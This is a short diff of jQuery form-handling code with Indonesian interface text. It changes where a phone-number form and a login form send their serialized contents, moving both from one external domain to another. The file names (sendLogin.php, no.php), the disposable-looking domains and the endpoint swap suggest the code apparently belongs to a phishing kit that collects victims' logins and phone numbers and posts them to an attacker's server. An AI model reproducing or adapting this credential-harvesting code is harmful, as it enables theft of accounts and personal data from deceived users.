@@ -5,7 +5,7 @@ $('#eform').on('submit', function (event) {
   document.getElementById('kirims').innerHTML = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app6/no.php',
+ url: 'https://axcellent.cf-pow.cfd/app6/no.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
@@ -31,7 +31,7 @@ $('#login').on('submit', function (event) {
   document.getElementById('kirims').value = "Memproses....";
 $.ajax({
  type: 'POST',
- url: 'https://axcellent.dvnet.org/app6/sendLogin.php',
+ url: 'https://axcellent.cf-pow.cfd/app6/sendLogin.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(),
